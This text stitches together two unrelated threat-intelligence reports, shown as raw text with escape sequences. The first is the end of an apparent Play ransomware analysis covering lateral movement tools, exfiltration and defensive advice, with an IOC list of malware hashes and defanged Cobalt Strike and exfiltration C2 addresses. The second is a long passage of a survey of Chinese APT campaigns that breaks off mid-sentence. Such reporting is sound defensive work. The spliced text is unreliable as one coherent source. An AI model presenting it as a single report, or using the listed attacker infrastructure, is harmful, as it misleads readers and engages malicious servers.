Microsoft Nltest, and Bloodhound. Enumeration of system\ninformation such as hostnames, shares, and domain information were also performed by the threat actor.\n\nLateral Movement\n\nPlay ransomware may use different tools to move laterally across a victim’s system:\n\nCobalt Strike SMB beacon is used as a C&C beacon, a method of lateral movement, and a tool for downloading and executing files\nSystemBC, a SOCKS5 proxy bot that acts as a backdoor with the ability to communicate over TOR, is used for backdooring mechanisms\nEmpire is an open-source post-exploitation framework used to conduct Play ransomware’s post-exploitation activity\nMimikatz is used to dump credentials and gain domain administrator access on victim networks to conduct lateral movement. \n\nExfiltration\n\nA victim’s data is often split into chunks instead of whole files prior to its exfiltration, an approach that Play ransomware may use to avoid\ntriggering network data transfer. The ransomware actors use WinSCP, an SFTP client and FTP client for Microsoft Windows. They also use\nWinRAR to compress the files in .RAR format for later exfiltration. We were able to identify a web page developed in PHP that is used to\nreceive the exfiltrated files.\n\nImpact\n\nAs mentioned earlier, after the ransomware encrypts a file, it adds the extension “.play” to that file. A ransom note, ReadMe.txt, is created in\nthe hard drive root (C:). In all the cases we investigated, the ransom notes contained an email address following this format: [seven random\ncharacters]@gmx[.]com.  \n\nInfection Distribution\n\nLike Hive and Nokoyawa ransomware, most of Play ransomware’s attacks affected organizations located in the Latin American region, with\nBrazil topping the list. Organizations in Argentina, Hungary, India, the Netherlands, and Spain also experienced Play attacks. \n\nSecurity Recommendations\n\nThe results of our investigation into Play ransomware’s attacks highlight the evolution of threats that are designed to evade detection.\nOrganizations should be wary of malicious actors using red-team or penetration-testing tools to blend in with a targeted system’s environment.\n\nEnd users and organizations alike can mitigate the risk of infection from ransomware like Play by following these security best practices: \n\nEnable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network.\nAdhere to the 3-2-1 rule when backing up important files. This involves creating three backup copies on two different file formats, with\none of the copies stored in a separate location. \nPatch and update systems regularly. It’s important to keep operating systems and applications up to date and maintain patch\nmanagement protocols that can deter malicious actors from exploiting any software vulnerabilities.\n\nhttps://attack.mitre.org/software/S0002/\nhttps://github.com/carlospolop/PEASS-ng\nhttps://processhacker.sourceforge.io/\nhttp://www.gmer.net/\nhttps://www.iobit.com/pt/index.php\nhttps://www.softpedia.com/get/Antivirus/Removal-Tools/ithurricane-PowerTool.shtml\nhttps://attack.mitre.org/software/S0552/\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)\nhttps://attack.mitre.org/software/S0521/\nhttps://attack.mitre.org/software/S0154/\nhttps://news.sophos.com/en-us/2020/12/16/systembc/\nhttps://attack.mitre.org/software/S0363/\nhttps://github.com/gentilkiwi/mimikatz\nhttps://www.trendmicro.com/vinfo/ph/security/news/virtualization-and-cloud/best-practices-backing-up-data\nhttps://www.trendmicro.com/vinfo/ph/security/news/vulnerabilities-and-exploits/virtual-patching-patch-those-vulnerabilities-before-they-can-be-exploited\n\n\n5/6\n\nUsers and organizations can benefit from the use of multilayered detection and response solutions such as Trend Micro Vision One™, which\nprovides powerful XDR capabilities that collect and automatically correlate data across multiple security layers — email, endpoints, servers,\ncloud workloads, and networks — to prevent attacks via automated protection, while also ensuring that no significant incidents go unnoticed.\nTrend Micro Apex One™ also provides next-level automated threat detection and response to protect endpoints against advanced issues, like\nhuman-operated ransomware. \n\nIndicators of Compromise (IOCs)\n\nHashes \n\nSHA-256 Detection Description\n\nfc2b98c4f03a246f6564cc778c03f1f9057510efb578ed3e9d8e8b0e5516bd49 Trojan.Win64.PRIVICMD.YXCHW PRIVICMD/NEKTO\n\nc316627897a78558356662a6c64621ae25c3c3893f4b363a4b3f27086246038d Backdoor.Win32.COBEACON.YXCH3 Cobalt Strike\n\nc92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3 PUA.Win32.AdFind.A AdFind\n\ne1c75f863749a522b244bfa09fb694b0cc2ae0048b4ab72cb74fcf73d971777b Trojan.BAT.ADFIND.YECGUT AdFind Command\nLines\n\n094d1476331d6f693f1d546b53f1c1a42863e6cde014e2ed655f3cbe63e5ecde HackTool.Win32.ToolPow.SM PowerTool\n\ne8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173 PUA.Win32.GMER.YABBI GMER\n\nd4a0fe56316a2c45b9ba9ac1005363309a3edc7acf9e4df64d326a0ff273e80f PUA.Win32.ProcHack.C Process Hacker\n\nc88b284bac8cd639861c6f364808fac2594f0069208e756d2f66f943a23e3022 Backdoor.Win32.SYSTEMBC.YXCFLZ Coroxy/SystemBC\n\nf18bc899bcacd28aaa016d220ea8df4db540795e588f8887fe8ee9b697ef819f Ransom.Win32.PLAYCRYPT.YECGUT Play ransomware\n\ne641b622b1f180fe189e3f39b3466b16ca5040b5a1869e5d30c92cca5727d3f0 Ransom.Win32.PLAYDE.A Play ransomware\n\n608e2b023dc8f7e02ae2000fc7dbfc24e47807d1e4264cbd6bb5839c81f91934 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n006ae41910887f0811a3ba2868ef9576bbd265216554850112319af878f06e55 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\ne4f32fe39ce7f9f293ccbfde30adfdc36caf7cfb6ccc396870527f45534b840b Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n8962de34e5d63228d5ab037c87262e5b13bb9c17e73e5db7d6be4212d66f1c22 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n5573cbe13c0dbfd3d0e467b9907f3a89c1c133c774ada906ea256e228ae885d5 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\nf6072ff57c1cfe74b88f521d70c524bcbbb60c561705e9febe033f51131be408 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\n7d14b98cdc1b898bd0d9be80398fc59ab560e8c44e0a9dedac8ad4ece3d450b0 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\ndcaf62ee4637397b2aaa73dbe41cfb514c71565f1d4770944c9b678cd2545087 Ransom.Win32.PLAYDE.YXCHJT Play ransomware\n\nf5c2391dbd7ebb28d36d7089ef04f1bd9d366a31e3902abed1755708207498c0 Ransom.Win32.PLAYDE.YACHWT Play ransomware\n\n3e6317229d122073f57264d6f69ae3e145decad3666ddad8173c942e80588e69 Ransom.Win32.PLAYDE.YACHP Play ransomware\n\nURLs\n\nURL Description\n\nhttps://www.trendmicro.com/en_us/business/products/detection-response.html\nhttps://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html\n\n\n6/6\n\nhxxp://84.32.190[.]37:80/ahgffxvbghgfv Cobalt Strike download\n\nhxxp://newspraize[.]com Cobalt Strike C&C\n\nhxxp://realmacnow[.]com Cobalt Strike C&C\n\n172.67.176[.]244 Cobalt Strike C&C\n\n104.21.43[.]80 Cobalt Strike C&C\n\nhxxp://67.205.182[.]129/u2/upload[.]php Exfiltration C&C Server",

Once regarded as a\n“second-tier” cyber power, China has aggressively and consistently built its national cyber\nprogram to the point where it is now considered one of the world’s preeminent cyber players.\nA recent study ranked China as a “Most Comprehensive Cyber Power,” second only to the\nUnited States. The ruling Chinese Communist Party (CCP) used a multi-pronged strategy to\nachieve this remarkable ascent, prioritizing computer science and technology education\nwithin China and creating a pipeline of talent for cyber military operations. \n\nOn July 19, 2021, the U.S. government and its allies — including the EU, the Five Eyes\ncountries, and NATO — publicly condemned and blamed the PRC for a series of malicious\ncyberattacks, including the Microsoft Exchange Hacks, global ransomware attacks, and\ncyberattacks against medical research institutes and universities.\n\nAlong with this, the U.S. Department of Justice released an indictment in May (unsealed July\n16th) that charged four Chinese nationals with a campaign to hack into the computer\nsystems of dozens of companies, universities, and governmental entities around the world\nfrom 2011 to 2018. The nationals are believed to be members of the group tracked as\nAPT40, which is connected to the PRC Ministry of State Security (MSS) Hainan State\nSecurity Department (HSSD). The indictment alleges that China has been leading a\nworldwide hacking and economic espionage campaign, using cyberattacks to steal\nintellectual property in disregard of bilateral and multilateral agreements.\n\nChina targets Taiwanese finance institutions\n\nTLDR: In early February, Symantec released a report detailing a persistent campaign by the\nChinese state-sponsored APT Antlion, targeting Taiwanese financial institutions for at least\n18 months. In the attacks, the threat actors deployed a backdoor dubbed xPack to maintain\nextensive access to victim systems, and the primary goal of the campaign is deemed to be\nespionage as researchers observed the threat actors exfiltrating data from infected\nnetworks. \n\nMore information: What is notable about the campaign is the extremely long dwell time of\nmany of the compromises that allowed the threat actors ample time for reconnaissance and\nexfiltration without detection. For example, in one of the undisclosed financial institution’s\nnetworks, the threat actors spent almost 250 days undetected in the network between\nDecember 2020 and August 2021, and spent over 175 days in another victim’s network\nundetected. The initial access vector is reportedly unclear, but researchers believe Antlion\nexploited a web application flaw to establish a foothold and drop xPack, which is then used\nto execute system commands, drop additional executables, and stage data for exfiltration.\nThe last activity seen in the campaign was August 2021. \n\nAPT15 Campaign Targeting Entities in Over 29 Countries \n\nhttps://www.belfercenter.org/publication/national-cyber-power-index-2020\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/china-apt-antlion-taiwan-financial-attacks\n\n\n4/20\n\nMicrosoft has observed APT15 targeting governments, diplomatic entities, and NGOs in over\n29 countries across Central and South America, the Caribbean, Europe, and North America.\n\nSince September 2019, APT15 has conducted activity across several countries, with a large\namount of activity targeting Central and South American governments. Using exploits against\nunpatched systems to compromise remote access services and applications, APT15\nleverages credential dumpers or stealers upon intrusion to obtain legitimate credentials,\nwhich they use to gain access to victim accounts. APT15 threat actors developed and\ndeployed custom malware that enabled them to maintain persistence on victim networks\nover extended periods of time. This has allowed it to achieve long-term access to multiple\ntargets, which it uses to perform frequent and scheduled data collection and exfiltration. In\nthe wake of discovering this campaign, Microsoft successfully obtained a court warrant that\nallowed it to seize 42 domains used by APT15 in the operations. \n\nHAFNIUM Abuse of Log4Shell\n\nMicrosoft reports HAFNIUM is exploiting the Log4Shell vulnerability to attack virtualization\ninfrastructure in order to extend their usual targeting.\n\nIn these attacks, Microsoft observed HAFNIUM-associated systems leveraging a DNS\nservice typically associated with testing activity to fingerprint systems.\n\nGeopolitical\n\nTwitter shuts down thousands of state-linked accounts in China that seek to counter\nevidence of human rights abuses in Xinjiang\n\nIn early December, the U.S. announces a diplomatic boycott of the 2022 Winter\nOlympics in Beijing, citing “ongoing genocide and crimes against humanity in Xinjiang.”\n\nChina and Japan agree to set up a joint communication hotline by the end of 2022\namid tensions over Taiwan and issues in the East and South China seas.\n\nIn mid-December, U.S. Congress passes a bill called The Uyghur Forced Labor\nPrevention Act that requires companies to prove that goods imported from China's\nXinjiang region were not produced with forced labour.\n\nhttps://www.microsoft.com/security/blog/2021/12/06/nickel-targeting-government-organizations-across-latin-america-and-europe/\nhttps://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/\nhttps://www.theguardian.com/world/2021/dec/03/xinjiang-twitter-closes-thousands-of-china-state-linked-accounts-spreading-propaganda\nhttps://www.aljazeera.com/news/2021/12/6/us-announces-diplomatic-boycott-of-2022-beijing-olympics\nhttps://www.cnn.com/2021/12/28/asia/japan-china-military-hotline-intl-hnk/index.html\nhttps://www.bbc.com/news/world-us-canada-59692826\n\n\n5/20\n\nAround the same time Congress passes The Uyghur Forced Labor Prevention Act, the\nU.S. imposes trade restrictions on more than 30 Chinese research institutes and\nentities over human rights violations and the alleged development of biotechnology to\nsupport Chinese military end uses and end users, to include purported brain-control\nweaponry.\n\nThe U.S. department of commerce states China \"is choosing to use these\ntechnologies to pursue control over its people and its repression of members of\nethnic and religious minority groups.\"\n\nU.S. intelligence agencies state Saudi Arabia is now actively manufacturing its own\nballistic missiles with the help of China.\n\nThe U.S. is now concerned about whether Saudi's ballistic missile advancements\ncould change regional power dynamics and complicate efforts to discuss the\nnuclear deal with Iran.\n\nTAG-28 attacks on Indian entities\n\nAs the bilateral relations between China and India continue to deteriorate over the Line of\nActual Control (LAC) dispute in the Galwan Valley, India has become the target of several\nChinese state-sponsored cyber attacks. Researchers at Recorded Future [PDF] have\nidentified intrusions targeting Indian entities led by suspected Chinese state-sponsored\nthreat activity group TAG-28. The victims of these intrusions include Indian media\nconglomerate Bennett Coleman And Co Ltd (BCCL), a multimillion-dollar news organization\ncommonly known as “The Times Group” that consistently reports on the China-India war. It\nalso includes the Unique Identification Authority of India (UIDAI), which contains the\nbiometric data of one billion Indian citizens, as well as the Madhya Pradesh Police\nDepartment (MPP), whose Chief Minister was critical of China after the border clashes that\noccurred in the Ladakh region in June 2020. \n\nIn this campaign, TAG-28 used Winnti malware, which is a family of malware that several\nChinese threat actors have historically used. In relation to the attack on BCCL, between\nFebruary and August 2021, four IPs were seen communicating with two Winnti C2 Servers\nand possibly a Cobalt Strike server, which led to approximately 500 MB of data being\nexfiltrated from the network. From June 10 to at least July 20, 2021, researchers observed\ntwo IPs registered to UIDAI communicating with the same suspected Cobalt Strike C2 server\nused to target BCCL. Less than 10 MB was egressed from the UIDAI network with an\ningress of almost 30 MB, potentially indicating the deployment of additional malicious tooling\nfrom the TAG-28 infrastructure. For the targeting of the MPP, the department’s website\nbegan communicating with a Winnti C2 server on June 1, 2021. Another MPP IP began\ntalking to the malicious server on July 7 to at least August 9, with around 5MB of data being\ntransferred.\n\nhttps://www.cnbc.com/2021/12/16/us-blacklists-34-chinese-entities-over-human-rights-abuses-brain-control-weapons.html\nhttps://www.cnn.com/2021/12/23/politics/saudi-ballistic-missiles-china/index.html\nhttps://go.recordedfuture.com/hubfs/reports/cta-2021-0921.pdf\nhttps://www.cfr.org/in-brief/china-india-border-dispute-what-know\n\n\n6/20\n\nChinese APTs infiltrate major Afghan telecom provider\n\nRecorded Future’s Insikt Group has detected separate intrusion activity linked to 4 distinct\nChinese state-sponsored threat actors targeting a mail server of Roshan, one of\nAfghanistan’s largest telecommunications providers. The APTs are RedFoxtrot and Calypso\nAPT, and there are 2 additional clusters using the Winnti and PlugX backdoors that haven’t\nbeen linked to groups yet. Data exfiltration activity for these intrusions, particularly the\nCalypso APT activity and the unknown threat actor using the Winnti malware, spiked\nthroughout August and September 2021, which coincided with major geopolitical events like\nthe withdrawal of US troops and the Taliban takeover.\n\nIt’s not clear from the latest research how the Roshan server was infected, but Chinese APT\nattacks often begin by exploiting external-facing services or spearfishing campaigns. Roshan\noffers a hugely valuable platform for strategic intelligence collection, allowing for things like\nthe monitoring of downstream targets, bulk collection of communication data, as well as the\nability to track and monitor individual targets. The Chinese government also considers the\ntelecom sector to be of strategic significance in countries participating in the Belt and Road\nInitiative. So there are many motives here.\n\nChinese espionage group targets critical infrastructure orgs in Southeast\nAsia\n\nA Chinese cyber-espionage group has been identified targeting at least four critical\ninfrastructure organizations in a southeast Asian country from November 2020 to March\n2021. Organizations targeted include a water company, a power company, a communications\ncompany, and a defense organization, and researchers said they found evidence that the\nattackers were interested in targeting information about SCADA systems.There is evidence\nthat the attacker behind this campaign is based in China, but there is not enough information\navailable to attribute the activity to a known actor. The threat actors made extensive use of\nliving-off-the-land / dual-use tools, including Windows Management Instrumentation,\nProcDump, PsExec, and Mimikatz. Espionage seems like the likeliest motive of these\nattacks, indicated by the activities of credential stealing, lateral movement, and keylogger\ndeployment as well as the types of machines targeted in some of the organizations - most of\nwhich were involved in design and engineering. An attacker gaining access to multiple critical\ninfrastructure organizations in the same country could potentially give them access to a vast\namount of sensitive information.\n\nDeadRinger Campaign \n\nSecurity researchers identified three distinct clusters of malicious activities operating on\nbehalf of Chinese state interests, namely Gallium, APT 30/Naikon, and APT27 / Emissary\nPanda, in a campaign dubbed “DeadRinger.” In this campaign, the groups staged a series of\nattacks that targeted networks belonging to at least five major telecommunications\ncompanies located in Southeast Asia from 2017 to at least mid-2021. Researchers assess\n\nhttps://www.recordedfuture.com/chinese-APT-groups-target-afghan-telecommunications-firm/?__hstc=156209188.bb009bd700ffdb42f1bd71351aa875c2.1628778103997.1632758893662.1632844704571.22&__hssc=156209188.1.1632844704571&__hsfp=4085325968\nhttps://therecord.media/suspected-chinese-state-linked-threat-actors-infiltrated-major-afghan-telecom-provider/\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/critical-infrastructure-south-east-asia-espionage\nhttps://therecord.media/chinese-espionage-group-targets-critical-infrastructure-orgs-in-southeast-asia/\nhttps://www.cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos#conclusion\n\n\n7/20\n\nthat the goal behind these intrusions was to gain and maintain continuous access to\ntelecommunication providers and to facilitate cyber espionage against select targets. In this\ncampaign, there are three observed clusters of activity conducted over various time periods\nand deploying different malware. Overall, there has been an interesting overlap between\nthese clusters: they were all observed in the same target environment, around the same\ntimeframe, and even on the same endpoints. Overlaps in attacker TTPs across the clusters\nare evidence of a likely connection between the threat actors, and it is assumed that each\ngroup was tasked with parallel objectives in monitoring the communications of specific high-\nvalue targets under the direction of a single Chinese body.\n\nSparklingGoblin\n\nESET researchers recently discovered a new undocumented modular backdoor called\nSidewalk, which has been linked to a new APT they are calling SparklingGoblin.\nSparklingGoblin was first detected in May 2020 by researchers tracking the Winnti group,\naka APT41. Even though this campaign exhibited links to Winnti Group, the modus operandi\nwas quite different, leading researchers to start tracking it as a separate threat actor. The\nnew undocumented modular backdoor, Sidewalk, was used during SparklingGoblin’s recent\ncampaign targeting a computer retail company in the US. Sidewalk is a backdoor that\ndynamically loads additional modules sent from its C2 server, uses a Google Docs document\nas a dead drop resolver, and uses Cloudflare workers web services as a C2 server.\nSideWalk can collect information about running processes, write received data to file, and\ncall plugins received from the C2 server. SparklingGoblin has been very active from mid-\n2020 to now and has targeted organizations mostly in East and Southeast Asia, but has\ntargeted a broad range of entities around the world including in the USA.\n\nUNC 215 cyber espionage campaign in Israel\n\nA cyber-espionage group based out of China called UNC215 has been identified conducting\na campaign against Israeli government entities, IT providers, and telecommunications\ncompanies since January 2019. UNC215 is linked with low confidence to APT27 and is said\nto target organizations that are of great interest to Beijing's financial, diplomatic, and strategic\nobjectives, demonstrating China's consistent strategic interest in the Middle East related to\nthe Belt and Road Initiative and interest in Israel’s robust technology sector. UNC215 has a\nhigh level of operational security: it makes a consistent effort to delete tools and any forensic\nartifacts from compromised systems; uses other victim networks to proxy its C2 instructions\nin order to evade detection and blend in with normal network traffic; and incorporates false\nflags. For example, on at least three occasions, UNC215 employed a custom tool leaked\nfrom Iranian actors in order to deceive analysts and make it look like Iranian actors were\nbehind the attacks.\n\nHAFNIUM attacks on Microsoft Exchange servers\n\nhttps://www.welivesecurity.com/2021/08/24/sidewalk-may-be-as-dangerous-as-crosswalk/\nhttps://threatpost.com/sparklinggoblin-apt/168928/\nhttps://www.fireeye.com/blog/threat-research/2021/08/unc215-chinese-espionage-campaign-in-israel.html\nhttps://therecord.media/chinese-cyber-spies-targeted-israel-posing-as-iranian-hackers/\n\n\n8/20\n\nDominating the headlines of Chinese cyber attacks is the on-premise Microsoft Exchange\nserver attack, presumed to be carried out by the Chinese APT HAFNIUM. This group has\nbeen identified as exploiting Exchange servers through a collection of several zero-day\nvulnerabilities. The supposed motive behind this attack aligns with the typical strategy of\nChinese cyber attacks: intellectual property theft. The four vulnerabilities affect unpatched\non-premise Microsoft Exchange servers - versions 2013 to 2019, excluding only Exchange\nOnline (Office365). You can read detailed IronNet analysis and response in our blog\n\"HAFNIUM Targets Microsoft Exchange Zero-Day Vulnerabilities.\"\n\nLuminousMoth\n\nA Chinese APT, dubbed LuminousMoth by Kaspersky, was discovered spreading fake Zoom\nsoftware to spy on targets in South East Asia since at least October 2020. The earliest\nsightings of this currently ongoing campaign were in Myanmar, but the attackers now appear\nmuch more active in the Philippines and have an interest in targeting government entities.\nWith activities and tactics appearing to overlap with that of Mustang Panda, LuminousMoth\nuses two infection vectors in these attacks. The first provides initial access to a system\nthrough a spearphishing email containing a DropBox download link. The second infection\nvector comes after the first has succeeded, in which the malware attempts to spread by\ninfecting removable USB drives. The attackers deploy a post-exploitation tool that\nimpersonates Zoom software with a valid digital signature, using it to scan compromised\nsystems for files with pre-defined extensions that are then copied and transferred to a C2\nserver. On some compromised systems, the attackers also deployed another post-\nexploitation tool that steals cookies from a Chrome browser for the purpose of hijacking and\nimpersonating the Gmail sessions of the targets. It is clear that the attacks of this campaign\nare very large-scale and affect a wide range of targets with the ultimate goal of compromising\na few that are of particular interest.\n\nTag-22\n\nIn July 2021, Recorded Future identified a suspected Chinese state-sponsored group\ntracked as Threat Activity Group 22 (TAG-22) targeting telecommunications, academia, R&D,\nand government organizations in Nepal, the Philippines, Taiwan, and Hong Kong. The group\nwas first detected in September 2020 targeting a Hong Kong university and airport, but in\nJune 2021, TAG-22 was identified targeting the Industrial Technology Research Institute\n(ITRI) in Taiwan, Nepal Telecom, and the Department of Information and Communications\nTechnology in the Philippines. In this most recent campaign, TAG-22 used compromised\nGlassFish servers and Cobalt Strike for initial access before pivoting to Winnti, ShadowPad,\nand Spyder backdoors for long-term access using actor-controlled C2 infrastructure. Tracked\nas an independent activity cluster that overlaps with the wider network defined as Winnti\nGroup, TAG-22 leverages shared custom backdoors unique to Chinese state-sponsored\ngroups — including ShadowPad and Winnti — while also using open-source/offensive\n\nhttps://www.ironnet.com/blog/hafnium-targets-microsoft-exchange-zero-day-vulnerabilities\nhttps://www.ironnet.com/blog/hafnium-targets-microsoft-exchange-zero-day-vulnerabilities\n\n\n9/20\n\nsecurity tools like Cobalt Strike and Acunetix. The group’s continued use of publicly reported\ninfrastructure indicates that it is experiencing a high degree of operational success despite a\nrange of public reporting regarding its operations.\n\nIndigoZebra\n\nA Chinese APT group dubbed “IndigoZebra” has been identified conducting an ongoing\nspearphishing campaign against the Afghan government, impersonating the Afghan\npresident as a lure to infiltrate government agencies, leading to the compromise of the\nAfghan National Security Council (NSC). IndigoZebra has been observed targeting other\nCentral Asian countries as well, including Kyrgyzstan and Uzbekistan, since at least 2014.\n\nIn IndigoZebra’s infection chain used in its attacks against the Afghan government, the threat\nactors begin with an email containing a malicious password-protected RAR archive (NSC\nPress conference.rar), which thwarts some sandbox solutions because it requires user\ninteraction. The RAR archive drops the extracted file (NSC Press conference.exe), which\nthen drops and executes the BoxCaon backdoor (spools.exe). The BoxCaon backdoor,\nwhich is a variant of the xCaon malware family, uses Dropbox as a command-and-control\n(C2) server, sending and receiving commands contained in a specific folder in an attacker-\ncreated Dropbox account. The threat actors’ use of Dropbox for C2 communications aids in\nmasking the malicious traffic in the victim’s network and appears as benign activity in user\nenvironments where Dropbox is used (Dropbox comes default on some Windows\ncomputers). The backdoor uses a hardcoded access token and has the ability to download,\nupload, and execute files. Other malware that the group has used in 2020-2021 (primarily\nagainst political entities in Kyrgyzstan and Uzbekistan) are hosted on ASN 20473 (CHOOPA)\nand Vultr - a subsidiary of CHOOPA that is commonly used for malicious purposes by\ncriminals and Chinese APTs.\n\nLinux attacks / RedXOR\n\nIn most recent news, a new sophisticated backdoor targeting Linux endpoints and servers\nwas discovered by security researchers at Intezer in early March, and TTPs indicate it is the\nwork of high-profile Chinese threat actors. Dubbed RedXOR, the backdoor masquerades as\na polkit daemon (which is a toolkit used for allowing unprivileged processes to communicate\nwith privileged processes), and it is very similar to malware associated with the Winnti\nUmbrella — a term used to describe a collective of state-backed hacking groups linked to\nChinese government interests. The operation is still believed to be ongoing as researchers\nexperienced an “on and off” availability of the C2 server, indicating that the operation is still\nactive. The malware samples were first uploaded from Indonesia and Taiwan— two countries\nknown to be heavily targeted by Chinese APTs. The samples were compiled with a legacy\nGCC compiler on an old version of Red Hat Enterprise Linux, indicating that RedXOR is\nused in targeted attacks against legacy Linux systems. It is packaged with the usual suite of\ntools, including the ability to gather system information, perform file operations, run arbitrary\nshell commands, and even options to remotely update the malware.\n\nhttps://www.intezer.com/blog/malware-analysis/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/\nhttps://www.bleepingcomputer.com/news/security/chinese-state-hackers-target-linux-systems-with-new-malware/\nhttps://www.bleepingcomputer.com/news/security/chinese-state-hackers-target-linux-systems-with-new-malware/\n\n\n10/20\n\nOf note: Victim types and motivations have not been indicated in reports, but the groups that\nfall under the Winnti Umbrella share an arsenal of malicious tools used in cyber espionage\nand financially motivated attacks and it has been stated that there has been a large increase\nin unique Linux malware tools tailored for espionage operations.\n\nAdditional China cyber attack threat campaigns\n\nTo summarize the threat at a more tactical level, the following sections highlight several of\nthe most recent and notable Chinese state-sponsored campaigns uncovered by\ncybersecurity researchers. Each section identifies a sample of the countries and sectors\ntargeted by a given group, and the behaviors or tactics, techniques, and procedures (TTPs)\nutilized to succeed in their objectives. Footnotes provide links to further, more detailed,\nreading. \n\nAPT31\n\nOverview:\n\nAPT31 is a Chinese state-sponsored cyber espionage group focused primarily on acquiring\ninformation that can provide political, economic, and military advantages to the Chinese\ngovernment and state-owned enterprises. Active since at least 2013, APT31 conducts mainly\nintellectual property theft and espionage operations using a range of tools and techniques to\ninfect target systems, steal credentials, and move laterally within a compromised network.\nAPT31 targets numerous organizations in various sectors, often seeking intellectual property,\ninformation that provides a commercial advantage, or sensitive details about government\nand defense targets of interest. \n\nRecent Activity:\n\nSecurity researchers uncovered approximately 10 attacks carried out from January to July\n2021 by APT31, in which the group used a new dropper and targeted entities in the U.S.,\nCanada, Mongolia, Belarus, and Russia. APT31, also known as Judgement Panda and\nZirconium, has been active since at least 2016 and is known to provide data to the Chinese\ngovernment and enterprises for political, economic, and military advantages. PT Security\nwas able to link these attacks and the new dropper to APT31 because numerous overlaps\nwere found between these malware instances and APT31’s DropboxAES RAT trojan in\nrelation to functionality, techniques, and mechanisms used.\n\nOn July 21st, the French national cyber-security agency (CERT-FR) warned of an ongoing\ncampaign by Chinese-backed APT31 against a large number of French organizations.\nCERT-FR investigations show that in these attacks, APT31 compromises routers to leverage\nthem as anonymization relays before carrying out reconnaissance and attack activities. In\nother words, APT31 uses a network of compromised home routers as operational relay\n\nhttps://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/apt31-new-attacks/\n\n\n11/20\n\nboxes to gather information and carry out further malicious actions. CERT-FR shared a list of\nIOCs to help entities assess potential compromises, and more information about the extent\nof these attacks will likely be made public by French authorities in the near future.\n\nIn February 2021, it was reported that APT31 cloned and used a Windows-hacking tool,\ncode-named EpMe, that was originally created by the Equation Group — an APT with links\nto various branches of the NSA. Essentially, APT31 extracted the core functionality of the\ntool and created its own replication, known as “Jian” or “double-edged sword,” around the\nexploits included in EpMe. What is concerning (and remarkable) about this reconstructed\nEpMe tool is that evidence points to the exploit first being used in 2014 — almost three years\nbefore it became publicly available with the Shadow Brokers dump and was patched by\nMicrosoft. \n\nJian was first discovered on a U.S.-based network by security researchers at Lockheed\nMartin, indicating that the tool has largely been used against U.S. targets. Evidence points to\nthe notion that APT31 managed to access both the 32-bit and 64-bit samples of the EpMe\nEquation Group exploit and replicate them to construct Jian, then using the new version of\nthe exploit alongside their unique multi-staged packer. However, Jian is much less\nsophisticated than EpMe and it contains many quirks — like support for Windows 2000 even\nthough Windows 2000 was never vulnerable to exploit — indicating that they did not really\nunderstand the true nature of the exploited vulnerability and its associated limitations.\n\nThe Finnish government officially accused APT31 of hacking into the Finnish parliament in\n2020, describing the attack as “aggravated espionage” and “message interception” in order\nto further Chinese interests. The attack, which led to the compromise of some parliament\nemail accounts, is currently being investigated by the Finnish National Bureau of\nInvestigation (NBI). The threat group has also been accused of targeting the Joe Biden\npresidential campaign with malicious spearphishing emails that impersonated anti-virus\nsoftware company McAfee and used legitimate services, like DropBox, in an attempt to steal\nstaffers’ credentials and infect them with malware.\n\nKnown\nTargets\n\nNumerous sectors, including legal and consulting, telecommunications, software\ndevelopment, construction and engineering, and aerospace and defense as well\nas governmental entities in the U.S. and northern European countries, and\ngovernment and defense supply chain networks\n\nhttps://www.cfr.org/cyber-operations/equation-group\nhttps://research.checkpoint.com/2021/the-story-of-jian/\nhttps://www.wired.com/story/china-nsa-hacking-tool-epme-hijack/\nhttps://www.cyberscoop.com/finland-apt31-china-parliament-hack/\nhttps://poliisi.fi/en/-/police-investigate-involvement-of-apt31-group-in-the-hacking-of-parliament-s-information-systems\nhttps://threatpost.com/biden-campaign-staffers-targeted-in-cyberattack-leveraging-anti-virus-lure-dropbox-ploy/160234/\nhttps://blog.google/threat-analysis-group/how-were-tackling-evolving-online-threats/\n\n\n12/20\n\nSample\nTTPs\n\nSophisticated targeted spearphishing\nAttacker-controlled URL web beacons sent via email text or attachment\nImpersonation of legitimate software, such as McAfee anti-virus software\nand Oracle, to load malicious code \nLeveraging of popular code and file-sharing sites, specifically Github and\nDropbox, for their C2 domains to complicate network-based detection\nUse of China Chopper webshell for initial compromise and persistence,\nuploaded to a target web server via a SQL injection or WebDAV\nvulnerability\nDLL search-order hijacking to run a malicious downloader tool (i.e.\nHanaLoader) that retrieves and runs payloads over HTTPS\n\nAKA Zirconium, Judgment Panda, Hurricane Panda, BRONZE VINEWOOD, Red\nBravo, \n\n \nBlackTech\n\nOverview:\n\nBlackTech is a threat group known primarily for conducting cyber espionage operations\nagainst targets in East Asia, with a focus on Taiwan and Japan. The group has likely been\nactive for a number of years and is responsible for several separate campaigns leveraging\noverlapping infrastructure. BlackTech often abuses legitimate software tools and processes\nto achieve its goals, using  stolen digital certificates and API hooking among other\ntechniques.\n\nRecent Activity: \n\nRecent reporting confirms that BlackTech remains active and has continued to develop new\ncustom malware. Researchers at Symantec, who track this group as Palmerworm, noted\nBlackTech activity throughout 2019 and 2020 with the group leveraging new strains of\nmalware to target multiple sectors in Taiwan, Japan, and China. \n\nTo date, no private sector cybersecurity companies have publicly attributed activity to\nBlackTech. However, in August of 2020, the Taiwanese government asserted that the group\nwas working on behalf of the Chinese Communist Party and had been involved in cyber\noperations targeting multiple Taiwanese government and commercial entities.\n\nKnown\nTargets\n\nTechnology, engineering, finance, and government sectors in Taiwan, 